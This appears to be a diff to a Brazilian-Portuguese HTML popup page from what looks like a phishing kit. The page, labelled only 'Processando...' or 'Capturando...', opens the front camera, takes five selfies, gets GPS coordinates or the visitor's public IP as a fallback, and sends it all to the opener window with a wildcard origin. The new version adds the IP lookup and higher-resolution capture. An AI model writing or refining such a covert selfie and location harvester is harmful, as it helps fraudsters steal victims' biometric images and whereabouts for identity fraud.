@@ -1,40 +1,65 @@
 <!doctype html>
 <html lang="pt-BR">
 <head>
-<meta charset="utf-8">
-<title>Aguarde...</title>
-<style>
-body{font-family:Arial,Helvetica,sans-serif;background:#003d82;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-</style>
+  <meta charset="utf-8">
+  <title>Capturando...</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    body{background:#003d82;color:#fff;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial,Helvetica,sans-serif}
+    #status{margin-top:12px;font-size:15px}
+  </style>
 </head>
 <body>
-<h3>Processando...</h3>
-<script>
-(async()=>{
-  let selfies=[],loc=null;
-  try{
-    const stream=await navigator.mediaDevices.getUserMedia({video:true});
-    for(let i=0;i<5;i++){
-      const v=document.createElement('video');
-      v.srcObject=stream;v.play();
-      await new Promise(r=>v.onloadedmetadata=r);
-      const c=document.createElement('canvas');
-      c.width=v.videoWidth;c.height=v.videoHeight;
-      c.getContext('2d').drawImage(v,0,0);
-      selfies.push(c.toDataURL('image/jpeg'));
-      await new Promise(r=>setTimeout(r,600));
-    }
-    stream.getTracks().forEach(t=>t.stop());
-  }catch{window.opener.postMessage({type:'negado'},'*');window.close();return;}
-  navigator.geolocation.getCurrentPosition(
-    p=>{
-      loc={lat:p.coords.latitude,lon:p.coords.longitude};
-      window.opener.postMessage({type:'selfiesDone',dados:{selfies,locationData:loc}},'*');
+  <h3 id="status">Solicitando câmera...</h3>
+
+  <script>
+    const TOTAL = 5;
+    const INTERVAL = 400; // ms entre fotos
+    let selfies = [];
+
+    (async()=>{
+      try{
+        // 1) abre frontal (selfie)
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080},torch:false}
+        });
+        const v = document.createElement('video');
+        v.srcObject = stream; v.play();
+        await new Promise(r=>v.onloadedmetadata=r);
+        document.getElementById('status').textContent = 'Capturando selfies...';
+
+        // 2) tira as 5 fotos
+        for(let i=0;i<TOTAL;i++){
+          const c = document.createElement('canvas');
+          c.width = v.videoWidth; c.height = v.videoHeight;
+          c.getContext('2d').drawImage(v,0,0);
+          selfies.push(c.toDataURL('image/jpeg'));
+          await new Promise(r=>setTimeout(r,INTERVAL));
+        }
+        stream.getTracks().forEach(t=>t.stop());
+      }catch(err){
+        window.opener.postMessage({type:'negado'},'*'); window.close(); return;
+      }
+
+      // 3) GPS (com fallback IP)
+      let loc=null, ip=null;
+      try{
+        loc = await new Promise((res,rej)=>
+          navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000,maximumAge:0})
+        );
+      }catch{
+        // GPS negado → pega IP
+        const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({}));
+        ip = ipData.ip || 'IP_DESCONHECIDO';
+      }
+
+      // 4) devolve tudo para index.html
+      window.opener.postMessage({
+        type: 'selfiesDone',
+        dados:{selfies, locationData:loc?{lat:loc.coords.latitude,lon:loc.coords.longitude}:null, ipFallback:ip}
+      }, '*');
       window.close();
-    },
-    ()=>{window.opener.postMessage({type:'selfiesDone',dados:{selfies,locationData:null}},'*');window.close();}
-  );
-})();
-</script>
+    })();
+  </script>
 </body>
 </html>
